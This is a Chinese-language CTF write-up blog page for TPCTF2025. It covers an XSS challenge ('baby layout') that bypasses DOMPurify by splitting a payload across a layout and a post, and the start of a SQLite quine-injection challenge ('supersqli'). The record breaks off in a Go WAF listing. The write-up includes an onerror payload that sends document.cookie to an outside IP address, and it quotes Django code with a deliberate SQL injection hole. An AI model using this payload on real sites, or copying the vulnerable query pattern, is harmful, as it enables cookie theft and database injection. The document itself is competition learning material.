<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Meteor_Kai">



    <meta name="description" content="Just Hack For Fun...">


    <meta name="keywords" content="Web exploits bring me great joy!">


<title>TPCTF2025 wp | Meteor_Kai</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const pagebody = document.getElementsByTagName('body')[0]

            function setTheme(status) {

                if (status === 'dark') {
                    window.sessionStorage.theme = 'dark'
                    pagebody.classList.add('dark-theme');

                } else if (status === 'light') {
                    window.sessionStorage.theme = 'light'
                    pagebody.classList.remove('dark-theme');
                }
            };

            setTheme(window.sessionStorage.theme)
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Meteor_Kai&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">Links</a>
                
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Meteor_Kai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">
                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
                </div>
            </div>
            <div class="menu" id="mobile-menu">
                
                <a class="menu-item" href="/archives">Posts</a>
                
                <a class="menu-item" href="/categories">Categories</a>
                
                <a class="menu-item" href="/tags">Tags</a>
                
                <a class="menu-item" href="/about">About</a>
                
                <a class="menu-item" href="/links">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.classList.contains("active")) {
            toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        } else {
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">TPCTF2025 wp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Meteor_Kai</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 30, 2025&nbsp;&nbsp;16:20:24</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h2><p>web：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> session <span class="keyword">from</span> <span class="string">&#x27;express-session&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> rateLimit <span class="keyword">from</span> <span class="string">&#x27;express-rate-limit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; randomBytes &#125; <span class="keyword">from</span> <span class="string">&#x27;crypto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> createDOMPurify <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">JSDOM</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;jsdom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable language_">window</span> &#125; = <span class="keyword">new</span> <span class="title function_">JSDOM</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> posts = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_LAYOUT</span> = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;article&gt;</span></span><br><span class="line"><span class="string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/article&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LENGTH_LIMIT</span> = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  app.<span class="title function_">use</span>(</span><br><span class="line">    <span class="string">&#x27;/api&#x27;</span>,</span><br><span class="line">    <span class="title function_">rateLimit</span>(&#123;</span><br><span class="line">      <span class="attr">windowMs</span>: <span class="number">60</span> * <span class="number">1000</span>,</span><br><span class="line">      <span class="attr">max</span>: <span class="number">10</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: <span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">layouts</span>) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">layouts</span> = [<span class="variable constant_">DEFAULT_LAYOUT</span>];</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">posts</span> = [];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Cache-Control&#x27;</span>, <span class="string">&#x27;no-store&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">posts</span>: req.<span class="property">session</span>.<span class="property">posts</span>,</span><br><span class="line">    <span class="attr">maxLayout</span>: req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="property">length</span> - <span class="number">1</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/post&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; content, layoutId &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> content !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> layoutId !== <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid params&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (content.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Content too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> layout = req.<span class="property">session</span>.<span class="property">layouts</span>[layoutId];</span><br><span class="line">  <span class="keyword">if</span> (layout === <span class="literal">undefined</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Layout not found&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sanitizedContent = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content);</span><br><span class="line">  <span class="keyword">const</span> body = layout.<span class="title function_">replace</span>(<span class="regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="function">() =&gt;</span> sanitizedContent);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (body.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Post too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  posts.<span class="title function_">set</span>(id, body);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">posts</span>.<span class="title function_">push</span>(id);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Post <span class="subst">$&#123;id&#125;</span> <span class="subst">$&#123;Buffer.<span class="keyword">from</span>(layout).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span> <span class="subst">$&#123;Buffer.<span class="keyword">from</span>(sanitizedContent).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/layout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; layout &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> layout !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid param&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (layout.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Layout too large&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sanitizedLayout = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(layout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="property">length</span>;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="title function_">push</span>(sanitizedLayout);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/post/:id&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">const</span> body = posts.<span class="title function_">get</span>(id);</span><br><span class="line">  <span class="keyword">if</span> (body === <span class="literal">undefined</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Post not found&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;post&#x27;</span>, &#123; id, body &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/clear&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">layouts</span> = [<span class="variable constant_">DEFAULT_LAYOUT</span>];</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">posts</span> = [];</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;cleared&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web server running on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里主要需要审计的就是web的代码，bot其实就是携带flag来访问。</p>
<p>来看看两个路由&#x2F;api&#x2F;layout，&#x2F;api&#x2F;post</p>
<p>对应页面中的功能点Create New Layout和Create New Post</p>
<p>第一个是设计模板，第二个是依据模板投递内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const body = layout.replace(/\&#123;\&#123;content\&#125;\&#125;/g, () =&gt; sanitizedContent);</span><br></pre></td></tr></table></figure>

<p>此处存在替换，就是把预定义的内容替换成POST的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const sanitizedContent = DOMPurify.sanitize(content);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout);</span><br></pre></td></tr></table></figure>

<p>同时我们也发现两处功能点都是存在保护措施的。有点难办。</p>
<p>这样的话，我们唯一能考虑的就是拼接了，让两个都不会被过滤，但是合起来又是恶意的！</p>
<p>尝试构造payload：此处的payload是不会被过滤掉的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&#123;&#123;content&#125;&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>

<img src="/2025/03/30/TPCTF2025-wp/image-20250324194507206.png" class="" title="This is an example image">

<img src="/2025/03/30/TPCTF2025-wp/image-20250324194451759.png" class="" title="This is an example image">

<p>然后在3000端口的web上输入以后</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250324194602300.png" class="" title="This is an example image">

<p>感觉已经拿捏了，再用id在bot上让bot去访问！</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250324194628528.png" class="" title="This is an example image">

<p>直接拿捏！！</p>
<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>题目一眼sql注入，根据下载到的源码，可以知道是sqlite数据库</p>
<p>接下来关注一下源码，The Most Important！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse,HttpRequest</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> AdminUser,Blog</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line">    username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;you are not admin.&#x27;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    users:AdminUser = AdminUser.objects.raw(<span class="string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;wrong password&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;flag&#x2F;目录，需要POST请求，传参username为admin和password，</p>
<p>接下来获取flag的化需要经过断言assert password &#x3D;&#x3D; users[0].password，users又来自于users:AdminUser &#x3D; AdminUser.objects.raw(“SELECT * FROM blog_adminuser WHERE username&#x3D;’%s’ and password &#x3D;’%s’” % (username,password))</p>
<p>这里就感觉很熟悉了，sql注入里有一种姿势叫quine注入！</p>
<blockquote>
<p>Quine又称为自产生程序，在sql注入中是一种使得输入的sql语句和输出的sql语句一致的技术，就是说输入的语句进行查询后生成的结果与输入的语句相同（自己生成自己），可以看到题目中的判断正是考察了这个点。</p>
</blockquote>
<p>但是题目怎么会这么简单呢？是存在waf的，我们看go程序</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span 